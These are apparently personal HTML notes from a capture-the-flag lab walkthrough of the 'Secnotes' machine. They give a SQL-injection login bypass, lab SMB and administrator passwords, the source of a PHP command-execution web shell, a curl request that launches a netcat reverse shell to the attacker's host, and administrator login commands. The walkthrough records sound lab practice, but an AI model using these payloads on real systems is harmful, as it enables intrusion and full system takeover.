<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.97 Secnotes</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.97 Secnotes</h1><br/>nmap found that 80, 445 and 8808 were open.<br />80 was running a webserver that allowed you to make an account and then take notes.<br />if you made an account with the name and password     &#39; or 1=1;-- -   you were dumped into the admins notes screen. This gave you his smb password.<br />tyler 92g!mA8BGjOirkL%OG*&amp;<br />smbmap showed me that there was a sharefolder I had access to named new-site<br />smbclient -L 10.10.10.97 -U tyler<br />Logged in with smbclient<br />smbclient &#39;//10.10.10.97/new-site&#39; -U tyler<br />uploaded a simple php web shell and nc.exe from the /usr/share/websomething<br /><br />&lt;HTML&gt;&lt;BODY&gt;<br />&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;<br />&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;<br />&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;<br />&lt;/FORM&gt;<br />&lt;pre&gt;<br />&lt;?php<br />if($_GET[&#39;cmd&#39;]) {<br />      system($_GET[&#39;cmd&#39;]);<br />        }<br />?&gt;<br />&lt;/pre&gt;<br />&lt;/BODY&gt;&lt;/HTML&gt;<br /><br />curl <a href="http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232">http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232</a><br />nc -nlvp 3232 caught it. User shell as tyler.<br /><br />On tylers desktop there was a file named bash.lnk (looks like windows subsytem for linux is on this box).<br />bash.lnk shits itself and points so a directory that is not there (c:\windows\system32\bash.exe)<br />I run a findstr to find bash.exe<br />cd c:\windows<br />dir /s /b | findstr bash.exe<br /><br />turns out, bash.exe is in some system sxs file super deep.<br />copy and run it... now we are in WSL bash!!<br />in the root ~ directory I look at the ./bash_history and see that the administrator account has used smbclient form here and passed creds in clear text!<br />administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;<br />smbclient -U &#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39; \\\\10.10.10.97\\c$<br />Login successful!<br /><br />winexe -U administrator //10.10.10.97 cmd.exe</div></body></html>